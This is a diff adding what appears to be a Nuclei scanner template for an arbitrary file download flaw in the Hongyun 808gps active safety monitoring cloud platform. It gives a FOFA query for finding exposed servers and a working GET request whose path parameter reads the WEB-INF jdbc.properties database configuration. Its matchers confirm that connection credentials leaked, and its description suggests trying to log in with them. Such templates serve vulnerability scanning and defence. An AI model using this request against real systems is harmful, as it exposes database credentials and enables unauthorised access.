@@ -1,0 +1,26 @@
+id: hongyun-808gps-filedownload
+
+info:
+  name: 鸿运主动安全监控云平台任意文件下载
+  author: zan8in
+  severity: high
+  description: |-
+    FOFA: body="./open/webApi.html"
+    可读取数据库配置文件，可尝试登录
+  tags: hongyun
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties"
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'jdbc.connection.driver_class='
+          - 'jdbc.connection.url='
+        condition: and
